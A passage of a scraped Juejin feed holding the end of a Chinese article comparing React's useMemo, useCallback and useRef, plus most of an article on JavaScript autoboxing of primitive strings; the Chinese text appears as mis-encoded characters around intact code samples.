<li>ç‚¹å‡»Â <strong>åˆ‡æ¢ä¸»é¢˜</strong>Â â†’ ä¸è®¡ç®— âŒï¼ˆæ§åˆ¶å°æ— æ—¥å¿—ï¼‰</li>
</ul>
<blockquote>
<p>âœ¨Â <code>useMemo</code>Â çš„ä½œç”¨ï¼š<strong>ç¼“å­˜è®¡ç®—ç»“æœï¼Œä¾èµ–ä¸å˜å°±ä¸é‡ç®—ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-2">ä¸‰ã€ä¸‰å¤§ç¼“å­˜ Hook å¯¹æ¯”ï¼šåˆ«å†æ··ç”¨äº†ï¼</h3>
<p>å¾ˆå¤šåŒå­¦åˆ†ä¸æ¸…Â <code>useMemo</code>ã€<code>useCallback</code>ã€<code>useRef</code>ï¼Œå…¶å®å®ƒä»¬<strong>ç›®æ ‡å®Œå…¨ä¸åŒ</strong>ï¼š</p>





























<table><thead><tr><th>Hook</th><th>ç¼“å­˜ä»€ä¹ˆï¼Ÿ</th><th>å…¸å‹ç”¨é€”</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td><code>useRef</code></td><td>ä¸€ä¸ªå¯å˜å®¹å™¨ï¼ˆ<code>.current</code>ï¼‰</td><td>å­˜ DOM å¼•ç”¨ã€å®šæ—¶å™¨ IDã€è·¨æ¸²æŸ“å˜é‡</td><td><code>{ current: T }</code></td></tr><tr><td><code>useCallback</code></td><td>å‡½æ•°</td><td>é˜²æ­¢å‡½æ•°é‡å»ºå¯¼è‡´å­ç»„ä»¶é‡æ¸²æŸ“</td><td><code>Function</code></td></tr><tr><td><code>useMemo</code></td><td>ä»»æ„å€¼ï¼ˆå¯¹è±¡/æ•°ç»„/è®¡ç®—ç»“æœï¼‰</td><td>é¿å…é‡å¤æ‰§è¡Œæ˜‚è´µè®¡ç®—</td><td><code>T</code></td></tr></tbody></table>
<h4 data-id="heading-3">ğŸ’¡ ä¸€å¥è¯åŒºåˆ†ï¼š</h4>
<ul>
<li>æƒ³ç¼“å­˜<strong>ä¸€ä¸ªå€¼</strong>ï¼ˆä¸æ˜¯å‡½æ•°ï¼‰â†’Â <code>useMemo</code></li>
<li>æƒ³ç¼“å­˜<strong>ä¸€ä¸ªå‡½æ•°</strong>Â â†’Â <code>useCallback</code></li>
<li>æƒ³å­˜ä¸€ä¸ª<strong>ä¸è§¦å‘æ¸²æŸ“çš„å˜é‡</strong>Â â†’Â <code>useRef</code></li>
</ul>
<blockquote>
<p>âš ï¸ å¸¸è§è¯¯åŒºï¼š<br/>
â€œæˆ‘ç”¨Â <code>useRef</code>Â å­˜è®¡ç®—ç»“æœä¸å°±è¡Œäº†ï¼Ÿâ€<br/>
â†’ æŠ€æœ¯ä¸Šå¯è¡Œï¼Œä½†ä½ å¾—æ‰‹åŠ¨åˆ¤æ–­ä¾èµ–æ˜¯å¦å˜åŒ–ï¼Œ<strong>ææ˜“å‡ºé”™ä¸”ä¸å¯ç»´æŠ¤</strong>ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">å››ã€çµé­‚æ‹·é—®ï¼šReact çš„ useMemo vs Vue çš„ computedï¼Ÿ</h3>
<p>å¾ˆå¤šä» Vue è½¬ React çš„åŒå­¦ä¼šé—®ï¼š</p>
<blockquote>
<p>â€œ<code>useMemo</code>Â æ˜¯ä¸æ˜¯å°±ç­‰äº Vue çš„Â <code>computed</code>ï¼Ÿâ€</p>
</blockquote>
<p><strong>ç­”æ¡ˆæ˜¯ï¼šç›¸ä¼¼ï¼Œä½†åº•å±‚æœºåˆ¶å®Œå…¨ä¸åŒï¼</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>Vue <code>computed</code></th><th>React <code>useMemo</code></th></tr></thead><tbody><tr><td>å“åº”å¼åŸç†</td><td>è‡ªåŠ¨ä¾èµ–è¿½è¸ªï¼ˆProxy åŠ«æŒï¼‰</td><td>æ‰‹åŠ¨å£°æ˜ä¾èµ–ï¼ˆä¾èµ–æ•°ç»„ï¼‰</td></tr><tr><td>æ›´æ–°ç²’åº¦</td><td>ç»†ç²’åº¦ï¼ˆåªæ›´æ–°ç”¨åˆ°çš„æ•°æ®ï¼‰</td><td>ç»„ä»¶çº§ï¼ˆæ•´ä¸ªå‡½æ•°é‡æ‰§è¡Œï¼‰</td></tr><tr><td>æ˜¯å¦è‡ªåŠ¨ç¼“å­˜</td><td>âœ… æ˜¯</td><td>âœ… æ˜¯ï¼ˆä½†éœ€æ‰‹åŠ¨å†™ï¼‰</td></tr><tr><td>å¿ƒæ™ºæ¨¡å‹</td><td>â€œæ•°æ®å˜äº†ï¼Œè§†å›¾è‡ªåŠ¨è·Ÿä¸Šâ€</td><td>â€œçŠ¶æ€å˜äº†ï¼Œæˆ‘é‡æ–°æè¿° UIâ€</td></tr></tbody></table>
<blockquote>
<p>ğŸŒ° ä¸¾ä¸ªä¾‹å­ï¼š<br/>
åœ¨ Vue ä¸­ï¼Œä½ å†™Â <code>computed: { fullName() { return this.firstName + this.lastName } }</code>ï¼Œæ¡†æ¶<strong>è‡ªåŠ¨çŸ¥é“</strong>å®ƒä¾èµ–Â <code>firstName</code>Â å’ŒÂ <code>lastName</code>ã€‚<br/>
è€Œåœ¨ React ä¸­ï¼Œä½ å¿…é¡»<strong>æ˜¾å¼å†™å‡º</strong>Â <code>[firstName, lastName]</code>ï¼Œå¦åˆ™ä¼šç”¨æ—§å€¼ï¼</p>
</blockquote>
<p>âœ… æ‰€ä»¥ï¼š</p>
<ul>
<li><strong>Vue çš„ computed æ›´â€œæ™ºèƒ½â€</strong></li>
<li><strong>React çš„ useMemo æ›´â€œæ˜¾å¼å¯æ§â€</strong></li>
</ul>
<hr/>
<h3 data-id="heading-5">äº”ã€ä½¿ç”¨ useMemo çš„ 3 ä¸ªæœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>ä¸è¦è¿‡æ—©ä¼˜åŒ–</strong><br/>
ç®€å•è®¡ç®—ï¼ˆå¦‚Â <code>a + b</code>ï¼‰ä¸éœ€è¦Â <code>useMemo</code>ï¼Œåè€Œå¢åŠ å†…å­˜å¼€é”€ã€‚</p>
</li>
<li>
<p><strong>ä¾èµ–æ•°ç»„å¿…é¡»å†™å…¨</strong><br/>
æ¼æ‰ä¾èµ–ä¼šå¯¼è‡´â€œstale closureâ€ï¼ˆé—­åŒ…é™·é˜±ï¼‰ï¼Œç”¨ ESLint æ’ä»¶Â <code>exhaustive-deps</code>Â è‡ªåŠ¨æ£€æŸ¥ã€‚</p>
</li>
<li>
<p><strong>ä¸»è¦ç”¨äºä»¥ä¸‹åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æ˜‚è´µçš„è®¡ç®—ï¼ˆæ’åºã€è¿‡æ»¤ã€æ ¼å¼åŒ–ï¼‰</li>
<li>åˆ›å»ºæ–°å¯¹è±¡/æ•°ç»„ï¼ˆé¿å…å­ç»„ä»¶å› å¼•ç”¨å˜åŒ–é‡æ¸²æŸ“ï¼‰</li>
<li>ä¼ é€’ props ç»™Â <code>React.memo</code>Â åŒ…è£¹çš„å­ç»„ä»¶</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-6">å…­ã€æ€»ç»“</h3>
<ul>
<li><code>useMemo</code>Â ä¸æ˜¯ä¸‡èƒ½è¯ï¼Œä½†å®ƒæ˜¯<strong>æ€§èƒ½ä¼˜åŒ–çš„å…³é”®å·¥å…·</strong>ã€‚</li>
<li>å®ƒå’ŒÂ <code>useCallback</code>ã€<code>useRef</code>Â å„å¸å…¶èŒï¼Œ<strong>ä¸è¦æ··ç”¨</strong>ã€‚</li>
<li>ä¸ Vue çš„Â <code>computed</code>Â ç›¸æ¯”ï¼ŒReact æ›´å¼ºè°ƒ<strong>æ˜¾å¼ä¾èµ–å£°æ˜</strong>ï¼Œè¿™æ˜¯å‡½æ•°å¼æ€ç»´çš„æ ¸å¿ƒã€‚</li>
</ul>
<blockquote>
<p>ğŸ”‘Â <strong>è®°ä½</strong>ï¼š<br/>
<strong>â€œuseMemo ç¼“å­˜çš„æ˜¯å€¼ï¼ŒuseCallback ç¼“å­˜çš„æ˜¯å‡½æ•°ï¼ŒuseRef å­˜çš„æ˜¯ç›’å­ã€‚â€</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šæ·±å…¥ç†è§£ JavaScriptï¼šä¸ºä»€ä¹ˆåŸºæœ¬ç±»å‹ string ä¹Ÿèƒ½è°ƒç”¨ .lengthï¼Ÿã€‹]]></title>    <link>https://juejin.cn/post/7596883689826943039</link>    <guid>https://juejin.cn/post/7596883689826943039</guid>    <pubDate>2026-01-19T11:35:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689826943039" data-draft-id="7596883689826926655" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šæ·±å…¥ç†è§£ JavaScriptï¼šä¸ºä»€ä¹ˆåŸºæœ¬ç±»å‹ string ä¹Ÿèƒ½è°ƒç”¨ .lengthï¼Ÿã€‹"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T11:35:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·80110532256"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šæ·±å…¥ç†è§£ JavaScriptï¼šä¸ºä»€ä¹ˆåŸºæœ¬ç±»å‹ string ä¹Ÿèƒ½è°ƒç”¨ .lengthï¼Ÿã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·80110532256
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:35:24.000Z" title="Mon Jan 19 2026 11:35:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h4 data-id="heading-0">å‰è¨€</h4>
<p>åœ¨æ—¥å¸¸çš„ JavaScript å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¸å­—ç¬¦ä¸²æ‰“äº¤é“ã€‚è®¿é—®å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯å†åŸºç¡€ä¸è¿‡çš„æ“ä½œäº†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">str</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
console.log(str.length)<span class="hljs-comment">; // 5</span>
</code></pre>
<p>è¿™æ®µä»£ç çœ‹èµ·æ¥å¹³å¹³æ— å¥‡ï¼Œä½†ä½ æ˜¯å¦æ›¾æƒ³è¿‡è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š<code>str</code> æ˜¯ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹ï¼ˆprimitive typeï¼‰<code>string</code>ï¼Œè€Œæˆ‘ä»¬çŸ¥é“åŸºæœ¬æ•°æ®ç±»å‹æœ¬èº«æ˜¯ä¸èƒ½æ‹¥æœ‰å±æ€§å’Œæ–¹æ³•çš„ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆ <code>str.length</code> å´èƒ½æ­£å¸¸å·¥ä½œå‘¢ï¼Ÿ</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥æ­å¼€è¿™ä¸ªçœ‹ä¼¼ç®€å•æ“ä½œèƒŒåçš„ç§˜å¯†â€”â€”<strong>è‡ªåŠ¨è£…ç®±ï¼ˆAutoboxingï¼‰</strong> ã€‚</p>
<h4 data-id="heading-1">ä¸€ã€JavaScript æ•°æ®ç±»å‹çš„åˆ†ç±»</h4>
<p>åœ¨æ·±å…¥äº†è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ JavaScript çš„æ•°æ®ç±»å‹ã€‚å®ƒä»¬ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<ol>
<li>
<p><strong>åŸºæœ¬æ•°æ®ç±»å‹ (Primitives)</strong> :</p>
<ul>
<li><code>number</code></li>
<li><code>string</code></li>
<li><code>boolean</code></li>
<li><code>null</code></li>
<li><code>undefined</code></li>
<li><code>symbol</code> (ES6 æ–°å¢)</li>
<li><code>bigint</code> (ES2020 æ–°å¢)</li>
<li><strong>ç‰¹ç‚¹</strong>: åŸºæœ¬ç±»å‹çš„å€¼æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰ï¼Œå¹¶ä¸”æœ¬èº«æ²¡æœ‰å±æ€§å’Œæ–¹æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¼•ç”¨ç±»å‹ (Objects)</strong> :</p>
<ul>
<li><code>Object</code></li>
<li><code>Array</code></li>
<li><code>Function</code></li>
<li><code>Date</code></li>
<li><code>RegExp</code></li>
<li>åŒ…æ‹¬ <code>String</code>, <code>Number</code>, <code>Boolean</code> ç­‰åŒ…è£…å¯¹è±¡</li>
<li><strong>ç‰¹ç‚¹</strong>: å¼•ç”¨ç±»å‹çš„å€¼æ˜¯å¯å˜çš„ï¼Œæ‹¥æœ‰å±æ€§å’Œæ–¹æ³•ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-2">äºŒã€String å¯¹è±¡ vs. string åŸºæœ¬ç±»å‹</h4>
<p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>new String()</code> è¯­æ³•æ—¶ï¼Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>String</code> å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> primitiveStr = <span class="hljs-string">"hello"</span>;        <span class="hljs-comment">// åŸºæœ¬ç±»å‹ string</span>
<span class="hljs-keyword">const</span> stringObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// String å¯¹è±¡</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> primitiveStr); <span class="hljs-comment">// "string"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> stringObj);    <span class="hljs-comment">// "object"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(stringObj)); <span class="hljs-comment">// "[object String]"</span>
</code></pre>
<p>æ˜¾ç„¶ï¼Œ<code>stringObj</code> æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒè‡ªç„¶æ‹¥æœ‰ <code>.length</code> å±æ€§ï¼Œè¿™å¾ˆå¥½ç†è§£ã€‚</p>
<p>é‚£ä¹ˆï¼Œé—®é¢˜å°±å›åˆ°äº†æœ€åˆçš„ç–‘é—®ï¼šä¸ºä»€ä¹ˆ <code>primitiveStr</code> è¿™ä¸ªåŸºæœ¬ç±»å‹ä¹Ÿèƒ½è®¿é—® <code>.length</code>ï¼Ÿ</p>
<h4 data-id="heading-3">ä¸‰ã€æ­ç§˜ï¼šè‡ªåŠ¨è£…ç®± (Autoboxing)</h4>
<p>ç­”æ¡ˆå°±åœ¨ JavaScript å¼•æ“ä¸ºæˆ‘ä»¬é»˜é»˜æ‰§è¡Œçš„â€œè‡ªåŠ¨è£…ç®±â€è¿‡ç¨‹ã€‚</p>
<p>å½“ä½ çš„ä»£ç è¯•å›¾è®¿é—®ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹å€¼çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼ˆä¾‹å¦‚ <code>primitiveStr.length</code> æˆ– <code>primitiveStr.toUpperCase()</code>ï¼‰ï¼ŒJavaScript å¼•æ“ä¼šæŒ‰ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p>
<ol>
<li><strong>ä¸´æ—¶åˆ›å»ºå¯¹è±¡</strong>: å¼•æ“ä¼šæ ¹æ®åŸºæœ¬ç±»å‹çš„å€¼ï¼Œä¸´æ—¶åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„åŒ…è£…å¯¹è±¡ã€‚å¯¹äº <code>string</code>ï¼Œåˆ™åˆ›å»º <code>String</code> å¯¹è±¡ï¼›å¯¹äº <code>number</code>ï¼Œåˆ™åˆ›å»º <code>Number</code> å¯¹è±¡ï¼›å¯¹äº <code>boolean</code>ï¼Œåˆ™åˆ›å»º <code>Boolean</code> å¯¹è±¡ã€‚</li>
<li><strong>å§”æ‰˜æ“ä½œ</strong>: å¼•æ“å°†è¯·æ±‚çš„å±æ€§æˆ–æ–¹æ³•è°ƒç”¨å§”æ‰˜ç»™è¿™ä¸ªæ–°åˆ›å»ºçš„ä¸´æ—¶å¯¹è±¡ã€‚</li>
<li><strong>è¿”å›ç»“æœ</strong>: æ“ä½œå®Œæˆåï¼Œå°†ç»“æœè¿”å›ã€‚</li>
<li><strong>é”€æ¯å¯¹è±¡</strong>: è¿™ä¸ªä¸´æ—¶åˆ›å»ºçš„åŒ…è£…å¯¹è±¡éšå³è¢«é”€æ¯ã€‚</li>
</ol>
<p><strong>ç”¨ä»£ç æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å½“æ‰§è¡Œ primitiveStr.length æ—¶ï¼Œå¼•æ“å†…éƒ¨å¤§è‡´åšäº†è¿™äº›äº‹ï¼š</span>
<span class="hljs-keyword">const</span> tempStrObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(primitiveStr); <span class="hljs-comment">// 1. åˆ›å»ºä¸´æ—¶ String å¯¹è±¡</span>
<span class="hljs-keyword">const</span> length = tempStrObj.<span class="hljs-property">length</span>;            <span class="hljs-comment">// 2. åœ¨ä¸´æ—¶å¯¹è±¡ä¸Šè°ƒç”¨ .length</span>
<span class="hljs-comment">// tempStrObj è¢«é”€æ¯                        // 4. é”€æ¯ä¸´æ—¶å¯¹è±¡</span>
<span class="hljs-comment">// console.log(length); // 5               // 3. è¿”å›ç»“æœ</span>
</code></pre>
<p>æ­£æ˜¯å› ä¸ºè¿™ä¸ªä¸´æ—¶çš„ <code>String</code> å¯¹è±¡çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ‰èƒ½åœ¨åŸºæœ¬ç±»å‹ <code>string</code> ä¸Šè®¿é—®åˆ° <code>.length</code> å±æ€§ä»¥åŠå…¶ä»–å­—ç¬¦ä¸²æ–¹æ³•ï¼ˆå¦‚ <code>toUpperCase</code>, <code>substring</code>, <code>indexOf</code> ç­‰ï¼‰ã€‚</p>
<h4 data-id="heading-4">å››ã€å®è·µéªŒè¯</h4>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥æ›´ç›´è§‚åœ°æ„Ÿå— <code>string</code> åŸºæœ¬ç±»å‹å’Œ <code>String</code> å¯¹è±¡çš„åŒºåˆ«ä¸è”ç³»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> strBasic = <span class="hljs-string">"hello world"</span>;
<span class="hljs-keyword">const</span> strObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"hello world"</span>);

<span class="hljs-comment">// ä¸¤è€…éƒ½èƒ½è®¿é—® .length</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strBasic.<span class="hljs-property">length</span>); <span class="hljs-comment">// 11 - é€šè¿‡è‡ªåŠ¨è£…ç®±è®¿é—®</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-property">length</span>);   <span class="hljs-comment">// 11 - ç›´æ¥è®¿é—®å¯¹è±¡å±æ€§</span>

<span class="hljs-comment">// ä¸¤è€…éƒ½èƒ½è°ƒç”¨å­—ç¬¦ä¸²æ–¹æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strBasic.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// "HELLO WORLD" - è‡ªåŠ¨è£…ç®±åè°ƒç”¨</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">toUpperCase</span>());   <span class="hljs-comment">// "HELLO WORLD" - ç›´æ¥è°ƒç”¨å¯¹è±¡æ–¹æ³•</span>

<span class="hljs-comment">// typeof æ£€æŸ¥</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> strBasic); <span class="hljs-comment">// "string"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> strObj);   <span class="hljs-comment">// "object"</span>

<span class="hljs-comment">// è·å–åŸå§‹å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// "hello world" - String å¯¹è±¡çš„æ–¹æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj + <span class="hljs-string">""</span>);      <span class="hljs-comment">// "hello world" - éšå¼ç±»å‹è½¬æ¢</span>
</code></pre>
<h4 data-id="heading-5">äº”ã€æ³¨æ„äº‹é¡¹</h4>
<ol>
<li><strong>æ€§èƒ½</strong>: è‡ªåŠ¨è£…ç®±æ˜¯ä¸€ä¸ªéšå¼çš„ã€çŸ­æš‚çš„è¿‡ç¨‹ã€‚è™½ç„¶å®ƒæ–¹ä¾¿äº†æˆ‘ä»¬ç¼–ç¨‹ï¼Œä½†é¢‘ç¹åœ°è®¿é—®åŸºæœ¬ç±»å‹ä¸Šçš„å±æ€§/æ–¹æ³•å¯èƒ½ä¼šå¸¦æ¥å¾®å°çš„æ€§èƒ½å¼€é”€ï¼ˆå› ä¸ºæ¶‰åŠå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ï¼‰ã€‚åœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</li>
<li><strong>é¿å…ä½¿ç”¨åŒ…è£…å¯¹è±¡åˆ›å»ºåŸºæœ¬ç±»å‹</strong>: åº”è¯¥å§‹ç»ˆä½¿ç”¨å­—é¢é‡æ–¹å¼åˆ›å»ºåŸºæœ¬ç±»å‹ï¼ˆ<code>let str = "hello"</code>ï¼‰ï¼Œè€Œä¸æ˜¯æ„é€ å‡½æ•°æ–¹å¼ï¼ˆ<code>let str = new String("hello")</code>ï¼‰ã€‚åè€…åˆ›å»ºçš„æ˜¯å¯¹è±¡ï¼Œä¸ä»…æ€§èƒ½è¾ƒå·®ï¼Œè¿˜å¯èƒ½å¯¼è‡´ä¸€äº›æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨å¸ƒå°”åˆ¤æ–­æ—¶ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å±é™©ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> falsyStrObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">""</span>); <span class="hljs-comment">// ç©ºå­—ç¬¦ä¸²å¯¹è±¡</span>
